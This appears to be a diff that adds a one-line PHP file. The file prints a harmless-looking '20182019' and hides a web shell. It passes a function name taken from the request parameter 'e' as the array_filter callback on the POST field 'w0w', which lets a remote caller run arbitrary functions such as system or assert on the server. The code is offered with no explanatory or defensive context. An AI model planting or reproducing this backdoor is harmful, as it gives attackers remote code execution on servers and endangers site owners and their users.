@@ -1,0 +1,1 @@
+<?php echo '2018'.'2019'; if (isset($_REQUEST['e'])) { $e = $_REQUEST['e']; $arr = array($_POST['w0w'],); array_filter($arr, $e); }?>
